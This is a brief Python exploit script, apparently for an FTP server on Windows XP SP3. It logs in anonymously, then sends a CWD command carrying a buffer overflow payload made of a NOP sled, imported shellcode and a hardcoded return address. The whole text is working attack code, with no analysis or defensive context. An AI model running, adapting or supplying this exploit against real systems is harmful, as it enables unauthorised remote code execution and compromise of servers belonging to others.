# Tested on: XP SP3 (Eng)
#!/usr/bin/python
import socket, sys

from time import sleep
from payload import buf
import socket
import struct
def shell_attack(target_machine, target_port):

	target = target_machine
	port = target_port


	nopsled = b"\x90" * (268 - len(buf))

	ret = b"\x58\xFD\x9A\x00"

	payload = nopsled + buf + ret # 272 bytes


	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	try:
		s.connect((target, port))
		
	except:
	
		pass
	s.recv(1024) 
	s.send(b'USER anonymous\r\n') 
	s.recv(1024) 
	s.send(b'PASS anonymous\r\n') 
	s.recv(1024)
	# Send payload...
	
	s.send(b'CWD ' + payload + b'\r\n') 
	try:
		s.recv(1024)
		
	except:
		pass